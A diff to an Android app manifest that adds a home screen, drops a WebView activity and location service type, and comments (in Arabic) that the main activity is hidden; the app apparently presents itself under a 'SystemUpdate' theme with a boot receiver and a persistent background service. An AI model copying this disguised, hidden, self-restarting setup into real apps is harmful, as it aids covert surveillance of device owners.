@@ -26,7 +26,6 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
         android:allowBackup="true"
@@ -40,6 +39,7 @@
         android:largeHeap="true"
         android:theme="@style/Theme.SystemUpdate">
 
+        <!-- LoginActivity — الـ Launcher -->
         <activity
             android:name=".LoginActivity"
             android:exported="true"
@@ -52,6 +52,13 @@
             </intent-filter>
         </activity>
 
+        <!-- HomeActivity — الصفحة الرئيسية -->
+        <activity
+            android:name=".HomeActivity"
+            android:exported="false"
+            android:theme="@style/Theme.SystemUpdate" />
+
+        <!-- MainActivity — مخفية -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -60,19 +67,15 @@
             android:launchMode="singleTask"
             android:theme="@style/Theme.SystemUpdate" />
 
-        <activity
-            android:name=".WebViewActivity"
-            android:exported="false"
-            android:configChanges="orientation|screenSize|keyboardHidden"
-            android:theme="@style/Theme.SystemUpdate" />
-
+        <!-- BackgroundService -->
         <service
             android:name=".BackgroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|dataSync"
+            android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
+        <!-- BootReceiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
